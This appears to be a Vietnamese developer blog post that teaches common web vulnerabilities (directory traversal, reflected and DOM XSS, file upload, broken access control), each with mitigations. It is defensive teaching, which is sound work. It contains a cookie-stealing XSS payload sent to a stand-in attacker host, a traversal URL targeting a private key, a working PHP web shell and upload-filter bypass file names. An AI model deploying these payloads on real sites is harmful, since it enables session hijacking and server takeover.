## [Part 1](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-1-gDVK2BvrKLj)
## Part 2
### Directory Traversal
Là lỗ hổng cho phép hacker có thể đọc được các file trên server, cơ bản nhất là qua url, có thể là param hoặc đường dẫn trực tiếp

Ví dụ: bạn có url `foodle.com/menus?menu=menu.pdf` => `foodle.com/menus?menu=../../../../ssl/private.key` => xong cái server nhà bạn

Hoặc dễ thấy nhất là bạn có url file (thường là ảnh)  `foodle.com/upload/images/menu/menu2nd.png` => `oodle.com/upload/images` => full gia phả 3 đời của menu2nd.png đã hiện ra trước mặt anh hacker

![](https://images.viblo.asia/87e5717d-a438-433a-8451-19c5dfcf3a3e.png)

####  Phòng chống
##### 1. Sử dụng hệ thống quản lý nội dung
Trường hợp bạn quản lý nhiều file thì việc sử dụng một hệ thông bên thứ 3 giúp hỗ trợ quản lý là việc lên làm và dù có thể phải trả một khoản phí hàng năm, nhưng vấn đề hoàn toàn không phải lo nữa.
##### 2. Chuyển hướng file
Thay vì dùng đường dẫn trực tiếp đến tệp, bạn có thể dùng api hoặc gì đó để lấy tệp qua một controller chung gian chả hạn, nhớ là valid input nhé
##### 3. Tách biệt các loại tài liệu
Tách các loại tài liệu ra, thành dùng chung, user, admin,.... với đó, bạn có thể phân quyền truy cập nên kể cả khi hacker có thể lần ra được đường dẫn, nếu không có quyền tương ứng, họ cũng không thể lấy được thông tin

### Reflected XSS
Hầu hết cách kĩ thuật XSS là Reflected XSS, hacker không gửi dữ liệu độc hại lên server nạn nhân, mà gửi trực tiếp link có chứa mã độc cho người dùng, khi người dùng click vào link này thì trang web sẽ được load chung với các đoạn script độc hại. Reflected XSS thường dùng để ăn cắp cookie, chiếm session,… của nạn nhân hoăc cài keylogger, trojan … vào máy tính nạn nhân.

VD: nạn nhân có tài khoản đang đăng nhập tại website `welp.com`

hacker sẽ gửi cho nạn nhân một đường dẫn kiểu vậy `www.welp.com?search=<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>`

Khi nạn nhân click vào, đầu tiên họ sẽ được mở đến trang `welp.com` và tìm kiếm `<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>`

Đoạn script sẽ thực thi và lấy cookie, đồng thời điều hướng sang web của hacker cùng với cookie trên param

vậy là hacker đã có thể truy cập vào `welp.com` bằng tài khoản của người dùng mà chả cần biết password

![](https://images.viblo.asia/fabbeb12-2173-467f-8c54-f7b36c4d22f0.png)

#### Phòng chống
##### 1. Validate input
Rất đơn giản và vô cùng hiệu quả, encode hết các ký tự đặc biệt, hiển thị chúng dưới dạng mã html, dùng white list để cho phép ký tự nào được input, ez game
```
"	&#34
#	&#35
&	&#38
'	&#39
(	&#40
)	&#41
/	&#47
;	&#59
<	&#60
>	&#62
```
##### 2. Dùng chính sách Content-Security
Các bạn có thể thêm thẻ meta này vào head
```
<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://apis.google.com">
```

### DOM-based XSS
Lỗi này, về kịch bản thì giống y hết lỗi trên, nhưng về bản chất thì có chút khác biệt. 
+ Reflected XSS, khi nạn nhân click vào link chứa mã độc, đoạn mã sẽ được server nhận như 1 param gửi lên và trả về lại cho nạn nhân như một phần nội dung hợp lệ của trang
+ DOM-based thì trang web sẽ nhận luôn đoạn mã độc trang url và render luôn mà không gửi về server, vẫn hack được session, cookie của bạn thôi, không cần lo đâu =))

Kịch bản tấn công thì nó kiểu vậy: 

Giả dụ bạn có 1 trang có infinite scroll (cuộn vô tận, không phải cuộn vô cực), bình thường khi cuộn đến đoạn load thêm, url sẽ có dạng `www.chinterest.com#1`, `www.chinterest.com#2`...

Đoạn mã để load dữ liệu trang sẽ như vậy
```javascript
$(document).onload(function() {
  var page = window.location.hash;
  loadPage(page);

  $("#page-no").html(page);
});
```

Hacker sẽ lợi dụng và đổi phần sau # => `www.chinterest.com#<script>window.location="http://www.haxxed.com?cookie="+document.cookie</script>`

Khi đó trình duyệt sẽ load mã đọc như 1 script hợp lệ của trang và thực thi

#### Phòng chống
##### 1. Dùng JavaScript Framework
##### 2. Kiểm tra code của bạn cẩn thận
##### 3. Parse JSON cẩn thận
##### 4. Dùng Development Tools để phát hiện các đoạn mã không an toàn
##### 5. Không dùng Uri fragments
##### 6.  Dùng chính sách Content-Security

### Lỗ hổng bảo mật File Upload
Upload 1 file mã độc lên server, rồi gọi đên nó bằng api mặc định của hệ thống hoặc gọi trực tiếp nhờ lỗi Directory Traversal để thực thi file, hacker có thể chiếm quyền server của bạn, hoặc bắt khác hàng của bạn tải các file mã đọc hoặc nhiều thứ linh tinh nguy hiểm khác. Nó thường xuyên nằm trong top 10 lỗi bảo mật luôn đấy nhé.

1. Tạo file hack.php
```php
<?php
  if(isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  } else {
    echo "What is your bidding?";
  }
?>
```
2. upload avatar:

![](https://images.viblo.asia/7b35e937-beac-4d3c-9e55-732ffd278f35.png)

3. mở file "avatar" vửa upload

![](https://images.viblo.asia/01509e89-b41b-44d6-abb9-f5544d39ab67.png)

4. excute command để lấy clip full không che

![](https://images.viblo.asia/0daed087-726d-46a7-be98-1fd73d1bbea2.png)

5. dạy nạn nhân tiếng mán để tiện cho việc khóc

PHP không phải loại file duy nhất, các đuôi như .php1, php2, 3... hoặc .lp, .cgi, đôi khi chỉ cần thay đổi hoa thường như PHP, PHP1,... Hoặc chứ vài 3 cái đuôi như `image.jpg.php` , thậm trí là `.htaccess`

#### Phòng chống
##### 1. Tách biệt các file upload
##### 2. Đảm bảo các tệp tải lên không thể thực thi
##### 3. Đổi tên file sau khi upload
##### 4. Validate format của file và đuôi mở rộng
cái này mà dùng whitelist thì đỡ khổ hơn, những vẫn có cách bypass: 
+ Null Byte Injection: `shell.php%00.jpg`
+ Double Extension: `shell.php.jpg`, `shell.php;.jpg`, `shell.php:jpg`
+ Invalid Extension Bypass
##### 5. validate content-type header
##### 6. Sử dụng quét virus
*Các bạn có thể xem thông tin về lỗi này kĩ hơn tại đây https://viblo.asia/p/khai-thac-cac-lo-hong-file-upload-phan-1-aWj53L6pK6m*
### Broken Access Control
Là lỗi xảy ra khi quản lý access control của user không được chắt chẽ, khiến user có thể truy cập thông tin hoặc thực hiện các hành động ngoài thầm quyền của họ, như xem hay sửa thông tin của user khác,... đây cũng là lỗi thường thuộc top 10 theo OWASP, nói chung thì cái vấn đề phân quyền cũng lằng nhằng phức tạp lắm.
#### Phòng chống
Cũng không có giải pháp chung nào cho mọi trường hợp khi gặp lỗi này, nhưng nói chung thì chúng ta nên tập chung vào 3 khía cạnh sau
##### 1. Xác thực
Xác nhận đúng là người dùng ứng dụng
##### 2. Ủy quyền
Quyết định quyền người dùng được và không được thực hiện một khi họ được xác thực
##### 3. Kiểm tra quyền
Kiểm tra lại quyền khi người dùng muốn thực hiện 1 dành động nào đó.